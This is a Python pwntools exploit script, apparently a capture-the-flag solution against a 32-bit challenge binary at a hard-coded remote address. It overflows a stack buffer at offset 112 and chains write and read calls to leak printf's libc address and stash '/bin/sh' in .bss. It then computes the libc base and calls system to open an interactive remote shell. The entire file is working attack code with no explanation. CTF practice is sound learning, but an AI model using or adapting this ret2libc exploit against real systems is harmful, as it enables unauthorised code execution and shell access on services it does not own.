from pwn import *

context.log_level = "debug"
HOST = "163.172.176.29"
PORT = 9036
conn = remote(HOST, PORT)
#conn = process("./32_chal", env={"LD_PRELOAD":"./libc.so.6"})
#offset 112
payload = "A" * 112
#s sym.imp.write
#[0x08048370]>
payload += p32(0x08048370)
#0x0804853d                 5e  pop esi
#0x0804853e                 5f  pop edi
#0x0804853f                 5d  pop ebp
#0x08048540                 c3  ret
payload += p32(0x0804853d)
payload += p32(1)
#s reloc.printf_16
#[0x0804a010]>
payload += p32(0x0804a010)
payload += p32(4)
#s sym.imp.read
#[0x08048330]>
payload += p32(0x08048330)
#0x0804853d                 5e  pop esi
#0x0804853e                 5f  pop edi
#0x0804853f                 5d  pop ebp
#0x08048540                 c3  ret
payload += p32(0x0804853d)
payload += p32(0)
#.bss              NOBITS          0804a028
payload += p32(0x0804a028 + 0x800)
payload += p32(8)
#s sym.main
#[0x0804847d]>
payload += p32(0x0804847d)
conn.sendafter("Hello pwners, \n", payload)
conn.recv(1)
#00049020 T printf
LIBC = u32(conn.recv(4)) -0x00049020
log.success("LIBC :0x%x" % LIBC)
conn.send('/bin/sh\x00')
payload = "A" * 108
#0003a940 W system
payload += p32(LIBC + 0x0003a940)
payload += "A" * 4
payload += p32(0x0804a028 + 0x800)
pause()
conn.sendafter("Hello pwners, \n", payload)
conn.interactive()
